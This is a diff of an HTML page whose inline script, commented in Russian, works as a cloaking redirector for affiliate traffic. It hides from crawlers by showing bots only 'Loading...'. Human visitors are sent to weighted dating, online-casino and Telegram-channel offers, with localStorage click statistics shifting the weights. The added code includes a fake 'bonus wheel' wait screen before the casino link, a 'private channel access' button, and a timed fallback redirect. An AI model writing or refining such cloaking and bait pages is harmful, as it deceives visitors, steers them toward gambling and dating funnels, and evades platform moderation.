@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Loading...</title>
+<title>Smart Redirect + Casino & Telegram + Fallback</title>
 <meta name="referrer" content="no-referrer">
 </head>
 <body>
@@ -10,7 +10,6 @@
 <script>
 // --- антибот
 const ua = navigator.userAgent.toLowerCase();
-
 const isBot =
   ua.includes("bot") ||
   ua.includes("crawler") ||
@@ -21,75 +20,106 @@ const isBot =
 
 // --- офферы
 const offers = [
-  { url: "https://tone.affomelody.com/click?pid=6350&offer_id=25", baseWeight: 0.4, key: "offer1" },
-  { url: "https://rdlwl.llovellydates.com/?utm_source=da57dc555e50572d&ban=tg&j1=1&s1=44438&s2=2224799", baseWeight: 0.4, key: "offer2" },
-  { url: "https://onlinepnpbit.com/2Vi4txHl/", baseWeight: 0.2, key: "offer3" }
+  { url: "https://tone.affomelody.com/click?pid=6350&offer_id=25", baseWeight: 0.5, key: "dating" },
+  { url: "https://onlinepnpbit.com/2Vi4txHl/", baseWeight: 0.3, key: "casino", prog: true },
+  { url: "https://t.me/+NFHjJC5nOndlZjky", baseWeight: 0.2, key: "tg", prog: false, fallback: "dating" }
 ];
 
-// --- получаем статистику
+// --- статистика
 function getStats() {
-  let stats = localStorage.getItem("stats");
-  return stats ? JSON.parse(stats) : {};
+  return JSON.parse(localStorage.getItem("stats") || "{}");
 }
-
-// --- сохраняем статистику
 function saveStats(stats) {
   localStorage.setItem("stats", JSON.stringify(stats));
 }
 
-// --- обновляем клики (обучение)
+// --- клики
 function trackClick(key) {
   let stats = getStats();
   stats[key] = (stats[key] || 0) + 1;
   saveStats(stats);
 }
 
-// --- выбираем оффер (гибрид)
-function chooseOffer() {
-  let saved = localStorage.getItem("offer_link");
-  if (saved) return saved;
-
+// --- усиление
+function trackConversion(key) {
   let stats = getStats();
+  stats[key] = (stats[key] || 0) + 5;
+  saveStats(stats);
+}
 
-  // если мало данных → базовое распределение
-  let totalClicks = Object.values(stats).reduce((a,b) => a+b, 0);
+// --- выбор оффера
+function chooseOffer() {
+  let stats = getStats();
+  let total = Object.values(stats).reduce((a,b)=>a+b,0);
 
-  let weights = [];
+  let weights = offers.map(o => {
+    let bonus = stats[o.key] ? stats[o.key] / (total || 1) : 0;
+    return o.baseWeight + bonus * 0.6;
+  });
 
-  for (let offer of offers) {
-    let bonus = stats[offer.key] ? stats[offer.key] / (totalClicks || 1) : 0;
-    let weight = offer.baseWeight + bonus * 0.5; // усиливаем успешные
-    weights.push(weight);
-  }
-
-  // нормализация
-  let sum = weights.reduce((a,b) => a+b, 0);
+  let sum = weights.reduce((a,b)=>a+b,0);
   weights = weights.map(w => w / sum);
 
-  // выбор
   let rand = Math.random();
   let cumulative = 0;
 
   for (let i = 0; i < offers.length; i++) {
     cumulative += weights[i];
-
     if (rand < cumulative) {
-      localStorage.setItem("offer_link", offers[i].url);
       trackClick(offers[i].key);
-      return offers[i].url;
+      return offers[i];
     }
   }
 }
 
-// --- редирект
+// --- запуск
 if (!isBot) {
-  setTimeout(() => {
-    window.location.replace(chooseOffer());
-  }, 800);
-} else {
-  document.body.innerHTML = "Loading...";
+  let selected = chooseOffer();
+  localStorage.setItem("last_offer", selected.key);
+
+  if (selected.prog) {
+    // --- казино прогрев
+    const landing = document.createElement("div");
+    landing.innerHTML = `<p>🎰 Вращаем колёсико бонуса... Подождите 3 сек</p>`;
+    document.body.innerHTML = "";
+    document.body.appendChild(landing);
+
+    setTimeout(() => {
+      window.location.replace(selected.url);
+    }, 3000);
+  } else if (selected.key === "tg") {
+    // --- Telegram с fallback
+    const landing = document.createElement("div");
+    landing.innerHTML = `
+      <p>⭐ Доступ к приватному каналу</p>
+      <p>Нажмите "Войти", чтобы перейти</p>
+      <button id="enterTG">Войти</button>
+    `;
+    document.body.innerHTML = "";
+    document.body.appendChild(landing);
+
+    document.getElementById("enterTG").addEventListener("click", () => {
+      trackClick("tg");
+      window.location.replace(selected.url);
+    });
+
+    // --- fallback через 5 сек
+    setTimeout(() => {
+      if (localStorage.getItem("last_offer") === "tg") {
+        const fb = offers.find(o => o.key === selected.fallback);
+        window.location.replace(fb.url);
+      }
+    }, 5000);
+  } else {
+    // --- обычный редирект для дейтинг
+    setTimeout(() => {
+      window.location.replace(selected.url);
+    }, 500);
+  }
 }
 </script>
+
+<p>Loading...</p>
 
 </body>
 </html>
